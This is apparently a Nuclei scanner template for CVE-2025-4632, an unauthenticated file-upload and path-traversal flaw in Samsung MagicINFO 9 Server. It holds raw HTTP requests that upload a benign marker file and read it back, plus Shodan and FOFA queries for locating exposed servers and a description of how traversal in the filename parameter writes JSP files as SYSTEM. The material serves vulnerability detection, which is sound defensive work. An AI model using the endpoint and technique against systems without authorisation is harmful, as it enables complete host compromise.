id: CVE-2025-4632

info:
  name: Samsung MagicINFO 9 Server < 21.1052 Arbitrary File Write (RCE)
  author: Prabhukiran161
  severity: critical
  description: |
    Samsung MagicINFO 9 Server versions prior to 21.1052 suffer from an improper
    limitation of a pathname to a restricted directory due to insufficient access controls. 
    This allows unauthenticated remote attackers with network access to perform 
    directory traversal and upload arbitrary files outside the intended location.  
    Since uploads are processed by the server with SYSTEM-level authority, this 
    leads to arbitrary file write and potential remote code execution.  

    The exploitation works by abusing the vulnerable upload endpoint
    `/MagicInfo/servlet/SWUpdateFileUploader` and supplying a crafted `filename` parameter
    containing traversal sequences (`../`) that break out of the restricted upload directory.  
    A successful exploit writes attacker-controlled content (such as JSP or system 
    executable files) into privileged paths, enabling full compromise.

  impact: |
    An unauthenticated attacker with network access can write arbitrary files
    as SYSTEM authority, resulting in a complete takeover of the vulnerable host.  

  remediation: |
    Upgrade to Samsung MagicINFO Server version 21.1052 or later, where 
    proper validation of the `filename` parameter prevents directory traversal 
    and enforces restricted upload paths.

  classification:
    cve-id: CVE-2025-4632
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cpe: cpe:/a:samsung:magicinfo_server:9.0.0
  
  metadata:
    vendor: samsung
    product: magicinfo
    shodan-query:
      - server: "magicinfo premium server"
    fofa-query:
      - server="magicinfo premium server"

  reference:
    - https://github.com/MantisToboggan-git/CVE-2025-4632-POC
    - https://nvd.nist.gov/vuln/detail/CVE-2025-4632
  
  tags: cve,cve2025,samsung,magicinfo,rce,file-upload,path-traversal


variables:
  filename: "{{rand_base(6)}}.txt"
  payload: "NUCLEI-CVE-2025-4632-TEST"

http:
  - raw:
      - |
        POST /MagicInfo/servlet/SWUpdateFileUploader?filename={{filename}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        Content-Length: {{len(payload)}}

        {{payload}}
    matchers:
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/MagicInfo/{{filename}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{payload}}"
        part: body
      - type: status
        status:
          - 200
